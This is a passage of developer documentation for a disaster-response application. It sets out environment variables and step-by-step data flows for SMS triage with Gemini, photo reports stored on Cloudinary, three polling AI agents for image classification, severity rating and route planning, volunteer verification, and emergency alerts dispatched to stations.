- cors@2.8.5 - CORS middleware
- dotenv@16.3.1 - Environment variables
- express@4.18.2 - Web framework
- mongoose@8.0.0 - MongoDB ODM
- socket.io@4.7.2 - Real-time communication
- uuid@9.0.0 - Unique IDs
- concurrently@8.2.2 - Parallel scripts
- cross-env@7.0.3 - Environment variables
- nodemon@3.0.1 - Hot reload

================================================================================
                      9. ENVIRONMENT VARIABLES
================================================================================

Create a .env file in the backend directory with:

# Server Configuration
NODE_ENV=development
PORT=5000

# MongoDB
MONGO_URI=mongodb://localhost:27017/DisasterResponseDB
MONGO_DB_NAME=DisasterResponseDB

# AI Services
GEMINI_API_KEY=your_google_gemini_api_key
OPENAI_API_KEY=your_openai_api_key (optional)

# Twilio SMS
TWILIO_ACCOUNT_SID=your_twilio_account_sid
TWILIO_AUTH_TOKEN=your_twilio_auth_token
TWILIO_PHONE_NUMBER=+1234567890

# Cloudinary Image Storage
CLOUDINARY_CLOUD_NAME=your_cloud_name
CLOUDINARY_API_KEY=your_api_key
CLOUDINARY_API_SECRET=your_api_secret

# Weather API
OPENWEATHER_API_KEY=your_openweathermap_api_key

# Session
SESSION_SECRET=your_secure_session_secret

# Geocoding
GEOCODE_DEFAULT_REGION=IN

# Agent Configuration
SENTINEL_POLL_INTERVAL=2
SENTINEL_MODEL_PATH=./models/disaster_model.keras
REPORTS_COLLECTION=reports

FRONTEND .env:
VITE_API_BASE_URL=http://localhost:5000/api

================================================================================
                   10. DETAILED DATA FLOW & REQUEST LIFECYCLE
================================================================================

This section provides an in-depth, step-by-step explanation of how data and
requests flow through every layer of the application.

================================================================================
10.1 SMS REPORT FLOW (STEP-BY-STEP)
================================================================================

When a citizen in distress sends an SMS, here's exactly what happens:

STEP 1: TWILIO RECEIVES SMS
---------------------------
- Citizen sends SMS to Twilio phone number (e.g., "Help! Fire at 123 Main St")
- Twilio's servers receive the message
- Twilio makes HTTP POST to configured webhook URL: POST /api/sms

STEP 2: EXPRESS RECEIVES WEBHOOK
--------------------------------
Request arrives at backend/routes/smsRoutes.js:
  → Express receives POST /api/sms
  → Request body contains:
      {
        From: "+1234567890",      // Sender's phone number
        Body: "Help! Fire...",    // SMS text content
        To: "+0987654321",        // Twilio number
        MessageSid: "SM...",      // Unique message ID
      }

STEP 3: SMS CONTROLLER PROCESSES REQUEST
----------------------------------------
File: backend/controllers/emergencySmsController.js

Function: handleIncomingSms(req, res)

  a) Extract data from request:
     const fromNumber = req.body.From;    // "+1234567890"
     const rawMessage = req.body.Body;    // "Help! Fire at 123 Main St"
  
  b) Log incoming message:
     logger.info(`Incoming SMS from ${fromNumber}: "${rawMessage}"`);

STEP 4: AI TRIAGE WITH GEMINI
-----------------------------
File: backend/services/geminiService.js

Function: triageSMS(rawMessage)

  a) Build AI prompt:
     SMS_TRIAGE_PROMPT = `
       You are a disaster response triage bot. Analyze the following SMS:
       Message: "Help! Fire at 123 Main St"
       Return ONLY valid JSON:
       {
         "needType": "Water|Food|Medical|Rescue|Other",
         "location": "string",
         "details": "string", 
         "urgency": "Low|Medium|High"
       }
     `
  
  b) Call Google Gemini API:
     const genAI = new GoogleGenerativeAI(config.geminiApiKey);
     const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash" });
     const result = await model.generateContent(prompt);
  
  c) Parse JSON response:
     const triageData = JSON.parse(result.response.text());
     // Result:
     {
       needType: "Rescue",
       location: "123 Main St",
       details: "Fire emergency reported",
       urgency: "High"
     }
  
  d) Validate enum values (needType must be valid category)
  
  e) If Gemini fails, fallback to regex-based parser:
     File: backend/utils/textParser.js
     Function: fallbackTriage(rawMessage) - uses keyword matching

STEP 5: GEOCODE LOCATION
------------------------
File: backend/services/addressGeocodingService.js

Function: geocodeLocation("123 Main St")

  a) Use Nominatim API (OpenStreetMap):
     GET https://nominatim.openstreetmap.org/search
       ?q=123 Main St
       &format=json
       &limit=1
  
  b) Parse response:
     coordinates = {
       lat: 18.5204,
       lon: 73.8567,
       formattedAddress: "123 Main St, Pune, Maharashtra"
     }
  
  c) If geocoding fails, return null (location will be unknown)

STEP 6: SAVE TO MONGODB
-----------------------
File: backend/models/NeedModel.js

  const newNeed = new Need({
    fromNumber: "+1234567890",
    rawMessage: "Help! Fire at 123 Main St",
    triageData: {
      needType: "Rescue",
      location: "123 Main St",
      details: "Fire emergency reported",
      urgency: "High"
    },
    coordinates: {
      lat: 18.5204,
      lon: 73.8567,
      formattedAddress: "123 Main St, Pune, Maharashtra"
    },
    status: "Unverified",
    emergencyStatus: "none"
  });

  await newNeed.save();
  // MongoDB generates _id: ObjectId("...")

STEP 7: SEND TWILIO RESPONSE
----------------------------
  const twiml = new MessagingResponse();
  twiml.message(
    `Your request has been received and logged.\n` +
    `A volunteer will verify it soon.\n` +
    `Your Report ID: ${newNeed._id}`
  );
  
  res.writeHead(200, { "Content-Type": "text/xml" });
  res.end(twiml.toString());

STEP 8: TWILIO SENDS CONFIRMATION SMS
-------------------------------------
Citizen receives SMS:
  "Your request has been received and logged.
   A volunteer will verify it soon.
   Your Report ID: 507f1f77bcf86cd799439011"

COMPLETE SMS DATA FLOW DIAGRAM:
-------------------------------

Citizen Phone → Twilio Cloud → POST /api/sms → Express Router
                                                    ↓
                                            smsRoutes.js
                                                    ↓
                                      emergencySmsController.js
                                              handleIncomingSms()
                                                    ↓
                              ┌─────────────────────┴─────────────────────┐
                              ↓                                           ↓
                    geminiService.js                          addressGeocodingService.js
                      triageSMS()                                geocodeLocation()
                    (Gemini AI API)                              (Nominatim API)
                              ↓                                           ↓
                              └─────────────────────┬─────────────────────┘
                                                    ↓
                                            NeedModel.js
                                           new Need().save()
                                                    ↓
                                              MongoDB
                                          needs collection
                                                    ↓
                                          TwiML Response
                                                    ↓
                                            Twilio Cloud
                                                    ↓
                                        SMS to Citizen Phone

================================================================================
10.2 PWA PHOTO REPORT FLOW (STEP-BY-STEP)
================================================================================

When a user submits a photo report through the Progressive Web App:

STEP 1: USER CAPTURES PHOTO IN REACT APP
-----------------------------------------
File: frontend/src/components/PhotoReporter.jsx

  a) User clicks camera button
  b) Browser requests camera permission
  c) User takes photo or selects from gallery
  d) React component captures:
     - Image file (Blob)
     - GPS coordinates from navigator.geolocation
     - Optional text description

STEP 2: FRONTEND PREPARES REQUEST
---------------------------------
File: frontend/src/services/apiService.js or direct in component

  // Build FormData for multipart upload
  const formData = new FormData();
  formData.append('image', imageBlob, 'photo.jpg');
  formData.append('lat', currentLocation.lat);
  formData.append('lng', currentLocation.lng);
  formData.append('message', userDescription || '');
  formData.append('source', 'PWA');

STEP 3: AXIOS SENDS REQUEST
---------------------------
File: frontend/src/services/api.js

  const response = await axios.post('/api/reports/photo', formData, {
    headers: {
      'Content-Type': 'multipart/form-data',
      'x-auth-pin': storedPin  // From auth interceptor
    },
    withCredentials: true
  });

STEP 4: EXPRESS RECEIVES MULTIPART REQUEST
------------------------------------------
File: backend/server.js

Route: POST /api/reports/photo

  a) Multer middleware processes file:
     
     const imageUpload = multer({
       storage: multer.memoryStorage(),  // Store in RAM
       limits: { fileSize: 10 * 1024 * 1024 },  // 10MB max
       fileFilter: (req, file, cb) => {
         // Validate image type (jpeg, png, webp, heic)
         if (allowedImageTypes.includes(file.mimetype)) {
           cb(null, true);
         } else {
           cb(new Error("Unsupported image format"));
         }
       }
     });
  
  b) After Multer:
     req.file = {
       buffer: <Buffer ...>,  // Raw image bytes
       mimetype: "image/jpeg",
       size: 1234567
     };
     req.body = { lat: "18.5204", lng: "73.8567", message: "...", source: "PWA" };

STEP 5: UPLOAD TO CLOUDINARY
----------------------------
File: backend/services/cloudinaryService.js

Function: uploadImageBuffer(req.file.buffer, options)

  a) Configure Cloudinary:
     cloudinary.config({
       cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
       api_key: process.env.CLOUDINARY_API_KEY,
       api_secret: process.env.CLOUDINARY_API_SECRET
     });
  
  b) Upload buffer:
     const uploadResult = await new Promise((resolve, reject) => {
       const uploadStream = cloudinary.uploader.upload_stream(
         { folder: "disaster-response/reports/photos" },
         (error, result) => {
           if (error) reject(error);
           else resolve(result);
         }
       );
       uploadStream.end(buffer);
     });
  
  c) Get secure URL:
     uploadResult.secure_url = "https://res.cloudinary.com/xxx/image/upload/v123/disaster-response/reports/photos/abc123.jpg"

STEP 6: CREATE REPORT IN MONGODB
--------------------------------
File: backend/models/ReportModel.js

  const report = new Report({
    source: "PWA",
    text: "Fire visible from my window",
    imageUrl: "https://res.cloudinary.com/xxx/...",
    location: {
      lat: 18.5204,
      lng: 73.8567
    },
    status: "Pending",  // CRITICAL: This triggers AI agents
    timestamp: new Date()
  });

  const savedReport = await report.save();

STEP 7: RETURN SUCCESS RESPONSE
-------------------------------
  res.status(201).json({
    success: true,
    message: "Report submitted successfully",
    data: {
      reportId: savedReport.reportId,
      id: savedReport._id,
      status: "Pending",
      timestamp: savedReport.timestamp
    }
  });

STEP 8: AI AGENTS DETECT NEW REPORT
-----------------------------------
(See Section 10.3 for detailed agent pipeline)

The Sentinel Agent polls MongoDB every 2 seconds and finds:
  { status: "Pending", imageUrl: { $exists: true } }

COMPLETE PWA PHOTO FLOW DIAGRAM:
--------------------------------

React Component (PhotoReporter.jsx)
         ↓
    [Camera/Gallery]
         ↓
    FormData Object
    - image: Blob
    - lat, lng: GPS
    - message: String
         ↓
    Axios POST /api/reports/photo
    (multipart/form-data)
         ↓
    Express Server (server.js)
         ↓
    Multer Middleware
    (Parse multipart, store in memory)
         ↓
    cloudinaryService.js
    uploadImageBuffer()
         ↓
    Cloudinary CDN
    (Returns secure_url)
         ↓
    ReportModel.js
    new Report().save()
         ↓
    MongoDB (reports collection)
    status: "Pending"
         ↓
    JSON Response to Frontend
         ↓
    React Updates UI
    "Report submitted successfully"
         ↓
    [Background: Sentinel Agent polls]
    Finds new pending report
         ↓
    AI Processing Pipeline Begins...

================================================================================
10.3 AI AGENT PIPELINE (DETAILED)
================================================================================

Three independent agents run as background processes, forming a processing
pipeline. Each agent polls MongoDB and processes reports in sequence.

AGENT STARTUP (server.js):
--------------------------

When the server starts, it spawns all three agents:

  function startAgents() {
    const agents = [
      { name: "Oracle Agent", command: "node", args: ["oracle_agent.js"] },
      { name: "Sentinel Agent", command: "python", args: ["sentinel_agent.py"] },
      { name: "Logistics Agent", command: "python", args: ["logistics_agent.py"] }
    ];

    agents.forEach((agent) => {
      const proc = spawn(agent.command, agent.args, {
        cwd: agentsDir,
        stdio: ["ignore", "pipe", "pipe"],  // Capture stdout/stderr
        env: { ...process.env, PYTHONUNBUFFERED: "1" }
      });
      
      agentProcesses.push({ name: agent.name, process: proc });
      
      // Pipe agent output to main console
      proc.stdout.on("data", (data) => console.log(`${agent.emoji} ${data}`));
      proc.stderr.on("data", (data) => console.error(`${agent.emoji} [ERROR] ${data}`));
    });
  }

================================================================================
SENTINEL AGENT - Visual Disaster Detection (Python)
================================================================================

File: backend/agents/sentinel_agent.py
Language: Python
Dependencies: TensorFlow, Keras, Pillow, PyMongo

PURPOSE: Analyze report images using deep learning to detect disaster type

MAIN LOOP:
----------
  while True:
      # 1. Atomically find and lock a pending report
      report = collection.find_one_and_update(
          {
              'status': 'Pending',
              'imageUrl': {'$ne': None, '$exists': True}
          },
          {
              '$set': {'status': 'Processing_Visual'}  # LOCK IT
          },
          return_document=ReturnDocument.AFTER
      )
      
      if report:
          process_report(report)
      else:
          print("[Sentinel] No pending visual reports found. Waiting...")
      
      time.sleep(2)  # Poll every 2 seconds

PROCESS_REPORT FUNCTION:
------------------------
  def process_report(report):
      report_id = report['_id']
      image_url = report['imageUrl']
      
      # Step 1: Download image from Cloudinary
      response = requests.get(image_url, timeout=10)
      image = Image.open(BytesIO(response.content))
      
      # Step 2: Preprocess for TensorFlow model
      image = image.resize((224, 224))  # Model expects 224x224
      if image.mode != 'RGB':
          image = image.convert('RGB')
      image_array = np.array(image) / 255.0  # Normalize to [0,1]
      image_array = np.expand_dims(image_array, axis=0)  # Add batch dimension
      
      # Step 3: Run inference
      predictions = model.predict(image_array, verbose=0)
      
      # Step 4: Interpret results (binary classification)
      disaster_prob = float(predictions[0][0])
      if disaster_prob >= 0.5:
          class_name = 'Disaster'
          confidence = disaster_prob
      else:
          class_name = 'Non-Disaster'
          confidence = 1.0 - disaster_prob
      
      # Step 5: Update MongoDB
      collection.update_one(
          {'_id': report_id},
          {
              '$set': {
                  'sentinelData': {
                      'tag': class_name,       # "Disaster" or "Non-Disaster"
                      'confidence': confidence  # 0.0 to 1.0
                  },
                  'status': 'Analyzed_Visual'  # NEXT STAGE
              }
          }
      )

ERROR HANDLING:
---------------
  try:
      process_report(report)
  except requests.exceptions.RequestException as e:
      # Image download failed
      collection.update_one(
          {'_id': report_id},
          {'$set': {'status': 'Error', 'errorMessage': f'Image download failed: {str(e)}'}}
      )
  except Exception as e:
      # Any other error
      collection.update_one(
          {'_id': report_id},
          {'$set': {'status': 'Error', 'errorMessage': str(e)}}
      )

================================================================================
ORACLE AGENT - Severity Assessment (Node.js)
================================================================================

File: backend/agents/oracle_agent.js
Language: Node.js
Dependencies: Mongoose, Gemini AI

PURPOSE: Use LLM to assess severity (1-10) and determine needs

MAIN LOOP:
----------
  async function pollForReports() {
    // Find reports that Sentinel has processed
    const report = await Report.findOneAndUpdate(
      {
        $or: [
          { status: "Analyzed_Visual" },
          { status: "Processing_Audio" }
        ],
        $or: [
          { oracleData: { $exists: false } },
          { "oracleData.severity": null }
        ]
      },
      { $set: { status: "Processing_Oracle" } },  // LOCK IT
      { new: true }
    );

    if (report) {
      await processReport(report);
    }
  }

  setInterval(pollForReports, 3000);  // Poll every 3 seconds

PROCESS_REPORT FUNCTION:
------------------------
  async function processReport(report) {
    console.log(`[Oracle] Processing Report ID: ${report._id}`);
    
    // Step 1: Build Gemini prompt
    const prompt = `
      You are a disaster response AI analyst.
      
      The visual agent detected "${report.sentinelData?.tag}" 
      with ${(report.sentinelData?.confidence * 100).toFixed(1)}% confidence.
      
      The user text reported: "${report.text || 'No text'}"
      
      Location: Lat ${report.location?.lat}, Lng ${report.location?.lng}
      
      Return ONLY valid JSON:
      {
        "severity": <number 1-10>,
        "needs": ["Water", "Medical", "Rescue", ...],
        "summary": "<brief situation description>"
      }
    `;
    
    // Step 2: Call Gemini AI
    const result = await model.generateContent(prompt);
    const analysisResult = JSON.parse(result.response.text());
    
    // Step 3: Update MongoDB
    await Report.findByIdAndUpdate(report._id, {
      $set: {
        oracleData: {
          severity: analysisResult.severity,    // 1-10
          needs: analysisResult.needs,          // ["Rescue", "Medical"]
          summary: analysisResult.summary       // "Building fire with..."
        },
        status: "Analyzed_Full"  // NEXT STAGE
      }
    });
    
    console.log(`[Oracle] Rated Severity: ${analysisResult.severity}`);
  }

================================================================================
LOGISTICS AGENT - Route Optimization & Dispatch (Python)
================================================================================

File: backend/agents/logistics_agent.py
Language: Python
Dependencies: PyMongo, Requests (for OSRM API)

PURPOSE: Find nearest emergency station and calculate optimal route

MAIN LOOP:
----------
  while True:
      # Step 1: Find critical reports (severity > threshold)
      reports = get_critical_reports(db)
      needs = get_verified_needs(db)
      
      # Step 2: Process each critical item
      for report in reports:
          process_critical_report(db, report)
      
      for need in needs:
          process_verified_need(db, need)
      
      time.sleep(5)  # Poll every 5 seconds

GET_CRITICAL_REPORTS FUNCTION:
------------------------------
  def get_critical_reports(db):
      query = {
          'oracleData.severity': {'$gt': SEVERITY_THRESHOLD},  # severity > 0
          'status': {'$in': ['Analyzed_Full', 'Analyzed']},
          '$or': [
              {'dispatch_status': {'$exists': False}},
              {'dispatch_status': 'Unassigned'}
          ]
      }
      return list(db.reports.find(query))

DETERMINE STATION TYPE:
-----------------------
  def determine_station_type_for_need(need):
      # Priority-ordered keyword matching
      NEED_TO_STATION_MAP = [
          ("fire suppression", "fire"),
          ("fire", "fire"),
          ("burning", "fire"),
          ("need police", "police"),
          ("police", "police"),
          ("stampede", "police"),
          ("need ambulance", "hospital"),
          ("medical", "hospital"),
          ("injured", "hospital"),
          ("rescue", "rescue"),
          ("trapped", "rescue"),
          ("flood", "rescue"),
      ]
      
      combined_text = f"{need_type} {raw_message} {details}".lower()
      
      for keyword, station_type in NEED_TO_STATION_MAP:
          if keyword in combined_text:
              return station_type
      
      return "rescue"  # Default fallback

FIND NEAREST STATION:
---------------------
  def find_nearest_station(db, station_type, report_lat, report_lon):
      stations = get_registered_stations(db)  # From cache or DB
      
      if station_type not in stations:
          return None
      
      min_distance = float('inf')
      nearest = None
      
      for station in stations[station_type]:
          distance = haversine(
              report_lat, report_lon,
              station['lat'], station['lon']
          )
          if distance < min_distance:
              min_distance = distance
              nearest = station
      
      return nearest

GET ROUTE FROM OSRM:
--------------------
  def get_osrm_route(waypoints, profile="driving"):
      # OSRM expects lon,lat (reversed from our lat,lon)
      coords_str = ";".join([f"{lon},{lat}" for lat, lon in waypoints])
      url = f"https://router.project-osrm.org/route/v1/{profile}/{coords_str}"
      
      params = {
          "overview": "full",
          "geometries": "geojson",
          "steps": "false"
      }
      
      response = requests.get(url, params=params, timeout=10)
      data = response.json()
      
      if data.get("code") != "Ok":
          return None  # Fallback to straight line
      
      osrm_route = data["routes"][0]
      
      # Convert GeoJSON coords (lon,lat) to our format (lat,lon)
      geometry = [[coord[1], coord[0]] for coord in osrm_route["geometry"]["coordinates"]]
      
      return {
          "geometry": geometry,
          "distance": osrm_route["distance"],  # meters
          "duration": osrm_route["duration"],  # seconds
      }

CREATE MISSION:
---------------
  def save_mission(db, routes, need_ids, station_info):
      mission = {
          'missionId': str(uuid.uuid4()),
          'routes': routes,
          'needIds': need_ids,
          'stationId': station_info['id'],
          'stationType': station_info['type'],
          'stationName': station_info['name'],
          'status': 'active',
          'createdAt': datetime.now(timezone.utc)
      }
      
      db.missions.insert_one(mission)
      
      # Mark needs as assigned
      for need_id in need_ids:
          db.needs.update_one(
              {'_id': need_id},
              {'$set': {'dispatch_status': 'Assigned'}}
          )

COMPLETE AGENT PIPELINE DIAGRAM:
--------------------------------

                         REPORT CREATED
                         status: "Pending"
                         imageUrl: exists
                               │
                               ▼
        ┌──────────────────────────────────────────┐
        │           SENTINEL AGENT (Python)         │
        │         Polls every 2 seconds            │
        │                                          │
        │  1. Find & lock: status → Processing_Visual │
        │  2. Download image from Cloudinary       │
        │  3. Preprocess (224x224, normalize)      │
        │  4. TensorFlow model.predict()           │
        │  5. Update: sentinelData, status → Analyzed_Visual │
        └──────────────────────────────────────────┘
                               │
                               ▼
        ┌──────────────────────────────────────────┐
        │            ORACLE AGENT (Node.js)         │
        │          Polls every 3 seconds           │
        │                                          │
        │  1. Find & lock: status → Processing_Oracle │
        │  2. Build Gemini prompt with visual data  │
        │  3. Call Gemini AI API                    │
        │  4. Parse severity, needs, summary        │
        │  5. Update: oracleData, status → Analyzed_Full │
        └──────────────────────────────────────────┘
                               │
                               ▼
        ┌──────────────────────────────────────────┐
        │          LOGISTICS AGENT (Python)         │
        │          Polls every 5 seconds           │
        │                                          │
        │  1. Find critical reports (severity > threshold) │
        │  2. Determine station type from keywords  │
        │  3. Find nearest station using Haversine  │
        │  4. Get road route from OSRM API          │
        │  5. Create mission in MongoDB             │
        │  6. Mark report: dispatch_status → Assigned │
        └──────────────────────────────────────────┘
                               │
                               ▼
                    MISSION CREATED
                    Routes to station
                    Visible on dashboard

================================================================================
10.4 VOLUNTEER VERIFICATION FLOW (DETAILED)
================================================================================

When a volunteer verifies a citizen's report:

STEP 1: VOLUNTEER OPENS TASK LIST
----------------------------------
File: frontend/src/components/VolunteerTaskList.jsx

  a) Component mounts and calls API:
     
     const { data: tasks } = useQuery({
       queryKey: ['volunteer-tasks'],
       queryFn: () => getUnverifiedTasks()
     });

STEP 2: FRONTEND FETCHES UNVERIFIED TASKS
-----------------------------------------
File: frontend/src/services/apiService.js

  async function getUnverifiedTasks() {
    const response = await apiClient.get("/tasks/unverified");
    return response.data.data || [];
  }

STEP 3: BACKEND PROCESSES TASK REQUEST
--------------------------------------
File: backend/controllers/volunteerTaskController.js

  export const getUnverifiedTasks = asyncHandler(async (req, res) => {
    // Query MongoDB for unverified needs
    const unverifiedNeeds = await Need.find({ status: "Unverified" })
      .sort({ createdAt: -1 })  // Newest first
      .limit(50);               // Max 50 tasks
    
    // Transform to DTO (Data Transfer Object)
    const tasks = unverifiedNeeds.map(need => ({
      id: need._id.toString(),
      taskId: need._id.toString(),
      description: need.triageData?.details || need.rawMessage,
      location: need.triageData?.location,
      needType: need.triageData?.needType,
      urgency: need.triageData?.urgency,
      phoneNumber: need.fromNumber,
      status: need.status,
      createdAt: need.createdAt,
      lat: need.coordinates?.lat,
      lon: need.coordinates?.lon,
    }));
    
    sendSuccess(res, tasks, "Unverified tasks retrieved successfully");
  });

STEP 4: VOLUNTEER SELECTS TASK AND VERIFIES
-------------------------------------------
File: frontend/src/components/VolunteerTaskList.jsx

  // User clicks "Verify" button on a task
  const handleVerify = async (taskId, notes) => {
    try {
      // Check if online
      if (navigator.onLine) {
        // Direct API call
        await postVerification(taskId, notes);
      } else {
        // Save to IndexedDB for later sync
        await db.pendingVerifications.add({
          taskId,
          data: { notes },
          timestamp: Date.now()
        });
      }
    } catch (error) {
      // Handle error
    }
  };

STEP 5: BACKEND PROCESSES VERIFICATION
--------------------------------------
File: backend/controllers/volunteerTaskController.js

  export const verifyTask = asyncHandler(async (req, res) => {
    const { taskId, volunteerNotes } = req.body;

    // Validate input
    if (!taskId) {
      throw new ApiError(400, "taskId is required");
    }

    // Update in MongoDB
    const updatedNeed = await Need.findByIdAndUpdate(
      taskId,
      {
        status: "Verified",           // Change status
        verificationNotes: volunteerNotes,
        verifiedAt: new Date(),
      },
      { new: true }  // Return updated document
    );

    if (!updatedNeed) {
      throw new ApiError(404, "Task not found");
    }

    logger.info(`Task ${taskId} verified successfully`);

    // CRITICAL: Dispatch emergency alert after verification
    if (updatedNeed.coordinates?.lat && updatedNeed.coordinates?.lon) {
      const alertResult = await dispatchEmergencyAlert(updatedNeed, "Need");
      logger.info(`Emergency alert dispatched: ${alertResult.alertId}`);
    }

    sendSuccess(res, {
      id: updatedNeed._id,
      status: updatedNeed.status,
      verifiedAt: updatedNeed.verifiedAt,
    }, "Task verified successfully");
  });

STEP 6: EMERGENCY ALERT DISPATCHED
----------------------------------
(See Section 10.5 for detailed emergency dispatch flow)

VERIFICATION FLOW DIAGRAM:
--------------------------

Volunteer Device                    Backend Server                    MongoDB
      │                                   │                              │
      │  GET /api/tasks/unverified        │                              │
      │ ─────────────────────────────────>│                              │
      │                                   │ Need.find({status:"Unverified"})
      │                                   │ ────────────────────────────>│
      │                                   │<───────────────────────────  │
      │                                   │   Array of needs             │
      │<──────────────────────────────────│                              │
      │    JSON: [task1, task2, ...]      │                              │
      │                                   │                              │
      │  [Volunteer reviews task]         │                              │
      │  [Goes to location]               │                              │
      │  [Takes verification photo]       │                              │
      │                                   │                              │
      │  POST /api/tasks/verify           │                              │
      │  { taskId, volunteerNotes }       │                              │
      │ ─────────────────────────────────>│                              │
      │                                   │ Need.findByIdAndUpdate()     │
      │                                   │ status: "Verified"           │
      │                                   │ ────────────────────────────>│
      │                                   │<───────────────────────────  │
      │                                   │                              │
      │                                   │ dispatchEmergencyAlert()     │
      │                                   │ ───────────> Station Server  │
      │                                   │                              │
      │<──────────────────────────────────│                              │
      │    { success: true }              │                              │

================================================================================
10.5 EMERGENCY DISPATCH FLOW (DETAILED)
================================================================================

When a verified need or high-severity report triggers emergency dispatch:

STEP 1: TRIGGER POINT
---------------------
Dispatch is triggered in two scenarios:

  a) After volunteer verification:
     File: backend/controllers/volunteerTaskController.js
     
     await dispatchEmergencyAlert(updatedNeed, "Need");

  b) Direct from Logistics Agent for high-severity reports:
     File: backend/agents/logistics_agent.py
     
     (Agent creates mission but doesn't directly call dispatch)

STEP 2: DETERMINE EMERGENCY TYPE
--------------------------------
File: backend/services/emergencyAlertService.js

  function determineEmergencyType(data) {
    // Priority 1: Check sentinelData (image analysis)
    if (data.sentinelData?.tag) {
      const tag = data.sentinelData.tag.toLowerCase();
      if (tag.includes("fire")) return "fire";
      if (tag.includes("flood")) return "flood";
      if (tag.includes("medical")) return "medical";
    }
    
    // Priority 2: Check text content for keywords
    const text = (data.text || data.rawMessage || "").toLowerCase();
    
    if (text.includes("fire") || text.includes("burning")) return "fire";
    if (text.includes("gas leak") || text.includes("chemical")) return "hazmat";
    if (text.includes("police") || text.includes("stampede")) return "police";
    if (text.includes("trapped") || text.includes("flood")) return "rescue";
    if (text.includes("ambulance") || text.includes("injured")) return "medical";
    
    // Priority 3: Check triageData needType
    if (data.triageData?.needType) {
      const map = {
        Water: "flood",
        Food: "general",
        Medical: "medical",
        Rescue: "rescue",
        Fire: "fire",
        Other: "general"
      };
      return map[data.triageData.needType] || "general";
    }
    
    return "general";
  }

STEP 3: MAP EMERGENCY TO STATION TYPE
-------------------------------------
  const DISASTER_TO_SERVICE_MAP = {
    fire: ["fire"],
    wildfire: ["fire"],
    medical: ["hospital"],
    injury: ["hospital"],
    flood: ["rescue"],
    earthquake: ["rescue"],
    trapped: ["rescue"],
    traffic_accident: ["police"],
    police: ["police"],
    general: ["rescue"],  // Default fallback
  };

  function getServiceTypesForEmergency(emergencyType) {
    return DISASTER_TO_SERVICE_MAP[emergencyType] || ["rescue"];
  }

STEP 4: FIND APPROPRIATE STATIONS
---------------------------------
  async function findStationsForEmergency(emergencyType, location) {
    const stationTypes = getServiceTypesForEmergency(emergencyType);
    
    // Query MongoDB for active stations of required type
    const stations = await EmergencyStation.find({
      type: { $in: stationTypes },
      status: "active"
    });
    
    // Sort by distance using Haversine formula
    const stationsWithDistance = stations.map(station => ({
      ...station.toObject(),
      distance: calculateDistance(
        location.lat, location.lng,
        station.location.lat, station.location.lng
      )
    }));
    
    return stationsWithDistance.sort((a, b) => a.distance - b.distance);
  }

STEP 5: CREATE ALERT DATA
-------------------------
  function createAlertData(sourceData, sourceType, emergencyType) {
    const location = sourceType === "Report" 
      ? sourceData.location 
      : sourceData.coordinates;
    
    // Determine severity
    let severity = 5;  // Default
    if (sourceData.oracleData?.severity) {
      severity = sourceData.oracleData.severity;
    } else if (sourceData.triageData?.urgency) {
      const map = { Low: 3, Medium: 5, High: 8 };
      severity = map[sourceData.triageData.urgency] || 5;
    }
    
    return {
      sourceType,           // "Report" or "Need"
      sourceId: sourceData._id,
      emergencyType,        // "fire", "medical", etc.
      severity,             // 1-10
      location: {
        lat: location.lat,
        lng: location.lng,
        address: sourceData.coordinates?.formattedAddress
      },
      title: `${emergencyType.toUpperCase()} ALERT`,
      description: sourceData.text || sourceData.rawMessage || "Emergency",
      needs: sourceData.oracleData?.needs || [],
      metadata: {
        originalText: sourceData.text || sourceData.rawMessage,
        imageUrl: sourceData.imageUrl,
        aiAnalysis: {
          sentinelData: sourceData.sentinelData,
          oracleData: sourceData.oracleData,
        }
      }
    };
  }

STEP 6: SEND ALERT TO STATION
-----------------------------
  async function sendAlertToStation(station, alertData) {
    // Build station's alert endpoint URL
    const endpoint = `${station.apiConfig.baseUrl}${station.apiConfig.alertEndpoint}`;
    // e.g., "http://localhost:4001/api/alerts/receive"
    
    // Send HTTP POST request
    const response = await axios.post(endpoint, {
      alertId: alertData.alertId,
      emergencyType: alertData.emergencyType,
      severity: alertData.severity,
      location: alertData.location,
      title: alertData.title,
      description: alertData.description,
      needs: alertData.needs,
      timestamp: new Date().toISOString(),
      fromStation: {
        name: "Disaster Response HQ",
        type: "command"
      }
    }, {
      headers: {
        "Content-Type": "application/json",
        "X-API-Key": station.apiConfig.apiKey
      },
      timeout: 10000  // 10 second timeout
    });
    
    return {
      success: response.status === 200,
      stationId: station.stationId,
      responseTime: Date.now()
    };
  }

STEP 7: STATION RECEIVES ALERT
------------------------------
File: station-demo/routes/alertRoutes.js

  router.post("/alerts/receive", async (req, res) => {
    const { alertId, emergencyType, severity, location, title, description } = req.body;
    
    // Save alert to station's MongoDB
    const alert = new Alert({
      alertId,
      emergencyType,
      severity,
      location,
      title,
      description,
      status: "pending",
      receivedAt: new Date()
    });
    await alert.save();
    
    // Emit via Socket.IO to connected dashboards
    const io = req.app.get("io");
    io.emit("newAlert", alert);
    
    res.json({ success: true, alertId });
  });

STEP 8: STATION DASHBOARD RECEIVES ALERT
----------------------------------------
File: station-demo/public/index.html (JavaScript)

  const socket = io();
  
  socket.on("newAlert", (alert) => {
    // Play audio alarm
    const alarmSound = new Audio("/sounds/alarm.mp3");
    alarmSound.play();
    
    // Display alert in UI
    displayAlert(alert);
    
    // Flash screen / show notification
    flashScreen("red");
  });

STEP 9: SAVE ALERT RECORD
-------------------------
File: backend/models/EmergencyAlertModel.js

  const alert = new EmergencyAlert({
    alertId: uuidv4(),
    sourceType: "Need",
    sourceDocument: needId,
    emergencyType: "fire",
    severity: 8,
    stationsSent: [
      { stationId: "fire-station-1", sentAt: new Date(), status: "sent" }
    ],
    status: "dispatched"
  });
  await alert.save();

STEP 10: UPDATE SOURCE DOCUMENT
-------------------------------
  await Need.findByIdAndUpdate(needId, {
    $set: {
      emergencyStatus: "dispatched",
      emergencyType: "fire",
      emergencyAlertId: alert.alertId,
      assignedStation: stationId
    }
  });

EMERGENCY DISPATCH FLOW DIAGRAM:
--------------------------------

  Verified Need / High-Severity Report
                    │
                    ▼
    ┌───────────────────────────────┐
    │ emergencyAlertService.js      │
    │ dispatchEmergencyAlert()      │
    └───────────────────────────────┘
                    │
        ┌───────────┴───────────┐
        ▼                       ▼
  determineEmergencyType()   findStationsForEmergency()
  "fire", "medical", etc.     Query MongoDB
                    │               │
                    └───────┬───────┘
                            ▼
                  createAlertData()
                  Build alert payload
                            │
                            ▼
              ┌─────────────────────────┐
              │    For each station:     │
              │  sendAlertToStation()    │
              └─────────────────────────┘
                            │
